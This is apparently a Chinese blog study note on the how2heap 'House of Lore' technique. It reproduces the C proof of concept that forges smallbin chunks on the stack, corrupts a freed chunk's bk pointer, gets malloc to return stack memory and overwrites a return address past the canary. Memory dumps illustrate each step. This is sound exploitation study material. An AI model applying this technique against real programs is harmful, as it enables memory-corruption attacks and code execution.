---
title: how2heap - house of lore
categories:
  - how2heap
tags: null
published: true
---

# Overview

- [house of lore](https://github.com/shellphish/how2heap/blob/master/house_of_lore.c)

```c
/*
Advanced exploitation of the House of Lore - Malloc Maleficarum.
This PoC take care also of the glibc hardening of smallbin corruption.

[ ... ]

else
    {
      bck = victim->bk;
    if (__glibc_unlikely (bck->fd != victim)){

                  errstr = "malloc(): smallbin double linked list corrupted";
                  goto errout;
                }

       set_inuse_bit_at_offset (victim, nb);
       bin->bk = bck;
       bck->fd = bin;

       [ ... ]

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

void jackpot(){ puts("Nice jump d00d"); exit(0); }

int main(int argc, char * argv[]){


  intptr_t* stack_buffer_1[4] = {0};
  intptr_t* stack_buffer_2[3] = {0};

  fprintf(stderr, "\nWelcome to the House of Lore\n");
  fprintf(stderr, "This is a revisited version that bypass also the hardening check introduced by glibc malloc\n");
  fprintf(stderr, "This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n");

  fprintf(stderr, "Allocating the victim chunk\n");
  intptr_t *victim = malloc(100);
  fprintf(stderr, "Allocated the first small chunk on the heap at %p\n", victim);

  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
  intptr_t *victim_chunk = victim-2;

  fprintf(stderr, "stack_buffer_1 at %p\n", (void*)stack_buffer_1);
  fprintf(stderr, "stack_buffer_2 at %p\n", (void*)stack_buffer_2);

  fprintf(stderr, "Create a fake chunk on the stack");
  fprintf(stderr, "Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"
         "in second to the last malloc, which putting stack address on smallbin list\n");
  stack_buffer_1[0] = 0;
  stack_buffer_1[1] = 0;
  stack_buffer_1[2] = victim_chunk;

  fprintf(stderr, "Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "
         "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "
         "chunk on stack");
  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
  
  fprintf(stderr, "Allocating another large chunk in order to avoid consolidating the top chunk with"
         "the small one during the free()\n");
  void *p5 = malloc(1000);
  fprintf(stderr, "Allocated the large chunk on the heap at %p\n", p5);


  fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
  free((void*)victim);

  fprintf(stderr, "\nIn the unsorted bin the victim's fwd and bk pointers are nil\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  fprintf(stderr, "Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n");
  fprintf(stderr, "This means that the chunk %p will be inserted in front of the SmallBin\n", victim);

  void *p2 = malloc(1200);
  fprintf(stderr, "The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n", p2);

  fprintf(stderr, "The victim chunk has been sorted and its fwd and bk pointers updated\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  //------------VULNERABILITY-----------

  fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");

  victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack

  //------------------------------------

  fprintf(stderr, "Now allocating a chunk with size equal to the first one freed\n");
  fprintf(stderr, "This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n");

  void *p3 = malloc(100);


  fprintf(stderr, "This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");
  char *p4 = malloc(100);
  fprintf(stderr, "p4 = malloc(100)\n");

  fprintf(stderr, "\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n",
         stack_buffer_2[2]);

  fprintf(stderr, "\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack
  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
  memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
}
```

# House Of Lore

这项攻击是基于伪造 small 和 large bins 的攻击，由于保护机制的更新，使得只有 small bin 适用（包括 fast bin），我在 ubuntu 16.04 64bit 上测试了该 poc。

首先在栈上能够控制 `7 * size_t` 大小的字节。

```c
  intptr_t* stack_buffer_1[4] = {0};
  intptr_t* stack_buffer_2[3] = {0};


0x7fffffffdd40:	0x00000000	0x00000000	0x00000000	0x00000000 -> stack_buffer_2
0x7fffffffdd50:	0x00000000	0x00000000	0x00400c4d	0x00000000
0x7fffffffdd60:	0x00000000	0x00000000	0x00000000	0x00000000 -> stack_buffer_1
0x7fffffffdd70:	0x00000000	0x00000000	0x00000000	0x00000000
```

分配一个 small bin 大小的 chunk。

```c
  intptr_t *victim = malloc(100);
  
  intptr_t *victim_chunk = victim-2;	// 让指针偏移到 chunk 的绝对地址

  
0x603000:	0x00000000	0x00000000	0x00000071	0x00000000 -> victim
0x603010:	0x00000000	0x00000000	0x00000000	0x00000000
0x603020:	0x00000000	0x00000000	0x00000000	0x00000000
0x603030:	0x00000000	0x00000000	0x00000000	0x00000000
0x603040:	0x00000000	0x00000000	0x00000000	0x00000000
0x603050:	0x00000000	0x00000000	0x00000000	0x00000000
0x603060:	0x00000000	0x00000000	0x00000000	0x00000000
```

构造栈上的两块 chunk，不用设置大小，将 stack_buffer_1 的 fd 设置成 victim chunk 的地址，bk 设置成 stack_buffer_2 的地址，而 stack_buffer_2 的 fd 则设置成 stack_buffer_1 的地址。

```c
  stack_buffer_1[0] = 0;
  stack_buffer_1[1] = 0;
  stack_buffer_1[2] = victim_chunk;

  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;


0x7fffffffdd40:	0x00000000	0x00000000	0x00000000	0x00000000 -> stack_buffer_2
0x7fffffffdd50:	0xffffdd60	0x00007fff	0x00400c4d	0x00000000
0x7fffffffdd60:	0x00000000	0x00000000	0x00000000	0x00000000 -> stack_buffer_1
0x7fffffffdd70:	0x00603000	0x00000000	0xffffdd40	0x00007fff
```

分配一块 large chunk 作为 victim 与 top chunk 的隔层，使其不会在 free 后与其合并（只要起隔层作用，small /fast chunk 也行）。

```c
  void *p5 = malloc(1000);
```

释放掉 victim，它首先会被插入到 unsorted bin 中。

```c
  free((void*)victim);
  
0x7ffff7dd1b20 <main_arena>:	0x00000000	0x00000000	0x00000000	0x00000000
0x7ffff7dd1b30 <main_arena+16>:	0x00000000	0x00000000	0x00000000	0x00000000
0x7ffff7dd1b40 <main_arena+32>:	0x00000000	0x00000000	0x00000000	0x00000000
0x7ffff7dd1b50 <main_arena+48>:	0x00603000	0x00000000	0x00000000	0x00000000
```

现在要 malloc 一块当前 unsorted bin 和 small bin 中没有的 chunk（也就是除了 victim 大小之外的 chunk），那么 victim 就会被放到 small bin 中（ubuntu 16.04 环境下测试：若 victim 为 fastbin 大小，则需 malloc 一块 largebin 大小的 chunk；若 victim 为 smallbin，则只需 malloc 一块比 victim 大的 chunk 即可）。

```c
  void *p2 = malloc(1200);

0x603000:	0x00000000	0x00000000	0x00000071	0x00000000
0x603010:	0xf7dd1bd8	0x00007fff	0xf7dd1bd8	0x00007fff
0x603020:	0x00000000	0x00000000	0x00000000	0x00000000

0x7ffff7dd1bd0 <main_arena+176>:	0xf7dd1bb8	0x00007fff	0xf7dd1bc8	0x00007fff
0x7ffff7dd1be0 <main_arena+192>:	0xf7dd1bc8	0x00007fff	0x00603000	0x00000000
0x7ffff7dd1bf0 <main_arena+208>:	0x00603000	0x00000000	0xf7dd1be8	0x00007fff
```

假设可以触发漏洞，改写 victim chunk 的 bk 为 stack_buffer_1 的地址，那么后续的 malloc 则可以获得一块栈上的内存，模拟绕过 stack canary 改写程序返回地址。

```c
  victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack

0x603000:	0x00000000	0x00000000	0x00000071	0x00000000
0x603010:	0xf7dd1bd8	0x00007fff	0xffffdd60	0x00007fff	-> stack_buffer_1 address
0x603020:	0x00000000	0x00000000	0x00000000	0x00000000

  void *p3 = malloc(100);
  
0x7ffff7dd1bd8 <main_arena+184>:	0xf7dd1bc8	0x00007fff	0xf7dd1bc8	0x00007fff
0x7ffff7dd1be8 <main_arena+200>:	0x00603000	0x00000000	0xffffdd40	0x00007fff
  
  char *p4 = malloc(100);

  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
  memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
```

运行结果：

![house_of_lore]({{ site.baseurl }}/images/house_of_lore.png)
